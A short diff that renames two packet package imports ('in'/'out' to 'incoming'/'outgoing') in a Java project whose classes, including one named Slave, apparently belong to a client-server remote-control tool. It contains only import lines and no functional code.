@@ -21,8 +21,8 @@ import com.redpois0n.ErrorDialog;
 import com.redpois0n.Main;
 import com.redpois0n.Slave;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.in.PacketBuilder;
-import com.redpois0n.packets.out.Header;
+import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.utils.IOUtils;
 
 
